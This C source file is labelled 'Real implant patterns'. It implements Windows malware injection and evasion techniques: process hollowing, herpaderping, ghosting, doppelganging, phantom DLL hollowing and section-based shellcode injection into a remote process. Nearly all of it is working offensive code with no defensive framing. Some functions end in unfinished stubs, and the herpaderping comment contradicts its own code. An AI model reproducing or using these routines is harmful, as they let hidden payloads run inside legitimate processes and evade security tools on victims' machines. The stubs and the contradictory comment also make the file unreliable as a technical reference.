/*
 * Process Hollowing / RunPE / Doppelganging / Ghosting
 * Real implant patterns
 */

#include <windows.h>

// ============================================================================
// PE MACROS
// ============================================================================

#define RVA(b,r)  ((BYTE*)(b)+(r))
#define DOS(m)    ((PIMAGE_DOS_HEADER)(m))
#define NT(m)     ((PIMAGE_NT_HEADERS)RVA(m,DOS(m)->e_lfanew))
#define SEC(m)    ((PIMAGE_SECTION_HEADER)RVA(m,DOS(m)->e_lfanew+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+NT(m)->FileHeader.SizeOfOptionalHeader))
#define DIR(m,i)  (&NT(m)->OptionalHeader.DataDirectory[i])

// ============================================================================
// NTAPI TYPEDEFS
// ============================================================================

typedef struct {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PBI;

typedef NTSTATUS (NTAPI *t_NtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *t_NtUVS)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *t_NtRVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *t_NtCS)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PLARGE_INTEGER, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *t_NtMVS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *t_NtCPE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, ULONG, HANDLE, HANDLE);
typedef NTSTATUS (NTAPI *t_NtCT)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// PEB offsets
#ifdef _WIN64
#define PEB_IMAGEBASE_OFF 0x10
#else
#define PEB_IMAGEBASE_OFF 0x08
#endif

// ============================================================================
// CLASSIC PROCESS HOLLOWING
// ============================================================================

BOOL hollow(char* target, BYTE* pe, DWORD pe_sz)
{
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    if(!CreateProcessA(target, 0, 0, 0, 0, 0x4, 0, 0, &si, &pi))
        return 0;

    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtQIP NtQIP = (t_NtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
    t_NtUVS NtUVS = (t_NtUVS)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    PBI pbi;
    NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), 0);

    PVOID img_base;
    ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + PEB_IMAGEBASE_OFF,
        &img_base, sizeof(img_base), 0);

    NtUVS(pi.hProcess, img_base);

    PIMAGE_NT_HEADERS nt = NT(pe);
    PVOID base = VirtualAllocEx(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage, 0x3000, 0x40);

    if(!base)
        base = VirtualAllocEx(pi.hProcess, 0, nt->OptionalHeader.SizeOfImage, 0x3000, 0x40);

    if(!base) {
        TerminateProcess(pi.hProcess, 1);
        return 0;
    }

    WriteProcessMemory(pi.hProcess, base, pe, nt->OptionalHeader.SizeOfHeaders, 0);

    PIMAGE_SECTION_HEADER sec = SEC(pe);
    for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if(sec[i].SizeOfRawData)
            WriteProcessMemory(pi.hProcess,
                RVA(base, sec[i].VirtualAddress),
                RVA(pe, sec[i].PointerToRawData),
                sec[i].SizeOfRawData, 0);
    }

    // Relocations
    DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
    if(delta && DIR(pe, 5)->Size) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)RVA(pe, DIR(pe, 5)->VirtualAddress);

        while(reloc->VirtualAddress) {
            DWORD cnt = (reloc->SizeOfBlock - 8) / 2;
            WORD* entry = (WORD*)(reloc + 1);

            for(DWORD j = 0; j < cnt; j++) {
                WORD type = entry[j] >> 12;
                WORD off = entry[j] & 0xFFF;

                if(type == 3 || type == 10) {
                    PVOID addr = RVA(base, reloc->VirtualAddress + off);
                    DWORD_PTR val;
                    ReadProcessMemory(pi.hProcess, addr, &val, sizeof(val), 0);
                    val += delta;
                    WriteProcessMemory(pi.hProcess, addr, &val, sizeof(val), 0);
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + PEB_IMAGEBASE_OFF,
        &base, sizeof(base), 0);

    CONTEXT ctx = {0};
    ctx.ContextFlags = 0x10001B;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ctx.Rcx = (DWORD64)RVA(base, nt->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eax = (DWORD)RVA(base, nt->OptionalHeader.AddressOfEntryPoint);
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

// ============================================================================
// PROCESS HERPADERPING
// ============================================================================

/*
 * 1. Create file with benign content
 * 2. Create section from file
 * 3. Overwrite file with malicious content
 * 4. Create process from (old) section
 * 5. File on disk now shows malicious content but process runs benign
 */

BOOL herpadering(char* path, BYTE* pe, DWORD pe_sz)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtCS NtCS = (t_NtCS)GetProcAddress(ntdll, "NtCreateSection");
    t_NtCPE NtCPE = (t_NtCPE)GetProcAddress(ntdll, "NtCreateProcessEx");

    // Create file
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
    if(hFile == INVALID_HANDLE_VALUE) return 0;

    // Write payload
    DWORD written;
    WriteFile(hFile, pe, pe_sz, &written, 0);

    // Create section before modifying
    HANDLE hSection;
    NtCS(&hSection, SECTION_ALL_ACCESS, 0, hFile, 0, SEC_IMAGE, 0, 0);

    // Overwrite with decoy
    SetFilePointer(hFile, 0, 0, FILE_BEGIN);
    SetEndOfFile(hFile);

    char decoy[] = "MZ...benign...";
    WriteFile(hFile, decoy, sizeof(decoy), &written, 0);
    CloseHandle(hFile);

    // Create process from section
    HANDLE hProcess;
    NtCPE(&hProcess, PROCESS_ALL_ACCESS, 0, GetCurrentProcess(), 0, hSection, 0, 0);

    // ... continue with process setup

    return 1;
}

// ============================================================================
// PROCESS GHOSTING
// ============================================================================

/*
 * 1. Create temp file
 * 2. Set FILE_DELETE_ON_CLOSE (delete pending)
 * 3. Write payload to file
 * 4. Create section from file
 * 5. Close file (deleted immediately)
 * 6. Create process from section
 */

typedef struct {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFO;

typedef NTSTATUS (NTAPI *t_NtSIF)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);

BOOL ghost(BYTE* pe, DWORD pe_sz)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtSIF NtSIF = (t_NtSIF)GetProcAddress(ntdll, "NtSetInformationFile");
    t_NtCS NtCS = (t_NtCS)GetProcAddress(ntdll, "NtCreateSection");
    t_NtCPE NtCPE = (t_NtCPE)GetProcAddress(ntdll, "NtCreateProcessEx");

    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    lstrcatA(tmp, "ghost.exe");

    // Create file
    HANDLE hFile = CreateFileA(tmp, GENERIC_READ | GENERIC_WRITE | DELETE,
        0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if(hFile == INVALID_HANDLE_VALUE) return 0;

    // Set delete pending
    FILE_DISPOSITION_INFO fdi = {TRUE};
    IO_STATUS_BLOCK iosb;
    NtSIF(hFile, &iosb, &fdi, sizeof(fdi), 13);  // FileDispositionInformation

    // Write payload
    DWORD written;
    WriteFile(hFile, pe, pe_sz, &written, 0);

    // Create section
    HANDLE hSection;
    NtCS(&hSection, SECTION_ALL_ACCESS, 0, hFile, 0, SEC_IMAGE, 0, 0);

    // Close file (triggers deletion)
    CloseHandle(hFile);

    // File is gone, but section persists
    HANDLE hProcess;
    NtCPE(&hProcess, PROCESS_ALL_ACCESS, 0, GetCurrentProcess(), 0, hSection, 0, 0);

    // ... continue with thread creation

    return 1;
}

// ============================================================================
// PROCESS DOPPELGANGING
// ============================================================================

/*
 * 1. NtCreateTransaction
 * 2. CreateFileTransacted on legit file
 * 3. Write payload to transacted file
 * 4. NtCreateSection from transacted file
 * 5. NtRollbackTransaction (file unchanged on disk)
 * 6. NtCreateProcessEx from section
 */

typedef NTSTATUS (NTAPI *t_NtCTx)(PHANDLE, ACCESS_MASK, PVOID, LPGUID, HANDLE, ULONG, ULONG, ULONG, PULONG, PUNICODE_STRING);
typedef NTSTATUS (NTAPI *t_NtRTx)(HANDLE, BOOLEAN);

BOOL doppelgang(char* target, BYTE* pe, DWORD pe_sz)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtCTx NtCTx = (t_NtCTx)GetProcAddress(ntdll, "NtCreateTransaction");
    t_NtRTx NtRTx = (t_NtRTx)GetProcAddress(ntdll, "NtRollbackTransaction");
    t_NtCS NtCS = (t_NtCS)GetProcAddress(ntdll, "NtCreateSection");
    t_NtCPE NtCPE = (t_NtCPE)GetProcAddress(ntdll, "NtCreateProcessEx");

    // Create transaction
    HANDLE hTx;
    NtCTx(&hTx, TRANSACTION_ALL_ACCESS, 0, 0, 0, 0, 0, 0, 0, 0);

    // Create transacted file
    HANDLE hFile = CreateFileTransactedA(target,
        GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, 0, hTx, 0, 0);

    // Write payload
    DWORD written;
    WriteFile(hFile, pe, pe_sz, &written, 0);

    // Create section from transacted file
    HANDLE hSection;
    NtCS(&hSection, SECTION_ALL_ACCESS, 0, hFile, 0, SEC_IMAGE, 0, 0);

    CloseHandle(hFile);

    // Rollback - file on disk unchanged
    NtRTx(hTx, TRUE);
    CloseHandle(hTx);

    // Create process
    HANDLE hProcess;
    NtCPE(&hProcess, PROCESS_ALL_ACCESS, 0, GetCurrentProcess(), 0, hSection, 0, 0);

    // ... continue with thread

    return 1;
}

// ============================================================================
// PHANTOM DLL HOLLOWING
// ============================================================================

/*
 * 1. Load DLL into own process
 * 2. Unmap from memory
 * 3. Map as SEC_IMAGE
 * 4. Stomp with PE payload
 * 5. Execute
 */

BOOL phantom(char* dll, BYTE* pe, DWORD pe_sz)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtUVS NtUVS = (t_NtUVS)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    t_NtCS NtCS = (t_NtCS)GetProcAddress(ntdll, "NtCreateSection");
    t_NtMVS NtMVS = (t_NtMVS)GetProcAddress(ntdll, "NtMapViewOfSection");

    // Load DLL normally
    HMODULE hDll = LoadLibraryExA(dll, 0, DONT_RESOLVE_DLL_REFERENCES);
    if(!hDll) return 0;

    // Unmap
    NtUVS(GetCurrentProcess(), hDll);

    // Create section
    HANDLE hSection;
    LARGE_INTEGER sz;
    sz.QuadPart = NT(pe)->OptionalHeader.SizeOfImage;
    NtCS(&hSection, SECTION_ALL_ACCESS, 0, 0, &sz, SEC_COMMIT, PAGE_EXECUTE_READWRITE, 0);

    // Map at same address
    PVOID base = hDll;
    SIZE_T viewsz = 0;
    NtMVS(hSection, GetCurrentProcess(), &base, 0, 0, 0, &viewsz, 1, 0, PAGE_EXECUTE_READWRITE);

    // Copy headers
    __movsb(base, pe, NT(pe)->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER sec = SEC(pe);
    for(WORD i = 0; i < NT(pe)->FileHeader.NumberOfSections; i++) {
        if(sec[i].SizeOfRawData)
            __movsb(RVA(base, sec[i].VirtualAddress),
                RVA(pe, sec[i].PointerToRawData),
                sec[i].SizeOfRawData);
    }

    // Fix relocations if needed
    // ... same as hollow

    // Execute
    ((void(*)())RVA(base, NT(pe)->OptionalHeader.AddressOfEntryPoint))();

    return 1;
}

// ============================================================================
// SECTION BASED INJECTION
// ============================================================================

BOOL section_inject(DWORD pid, BYTE* sc, DWORD len)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtCS NtCS = (t_NtCS)GetProcAddress(ntdll, "NtCreateSection");
    t_NtMVS NtMVS = (t_NtMVS)GetProcAddress(ntdll, "NtMapViewOfSection");
    t_NtCT NtCT = (t_NtCT)GetProcAddress(ntdll, "NtCreateThreadEx");

    // Create section
    HANDLE hSection;
    LARGE_INTEGER sz;
    sz.QuadPart = len;
    NtCS(&hSection, SECTION_ALL_ACCESS, 0, 0, &sz, SEC_COMMIT, PAGE_EXECUTE_READWRITE, 0);

    // Map in local process
    PVOID local = 0;
    SIZE_T viewsz = len;
    NtMVS(hSection, GetCurrentProcess(), &local, 0, 0, 0, &viewsz, 1, 0, PAGE_READWRITE);

    // Write shellcode
    __movsb(local, sc, len);

    // Map in remote process
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    PVOID remote = 0;
    NtMVS(hSection, hp, &remote, 0, 0, 0, &viewsz, 1, 0, PAGE_EXECUTE_READ);

    // Execute
    HANDLE ht;
    NtCT(&ht, THREAD_ALL_ACCESS, 0, hp, remote, 0, 0, 0, 0, 0, 0);

    CloseHandle(hp);
    return 1;
}

// ============================================================================
// EOF
// ============================================================================
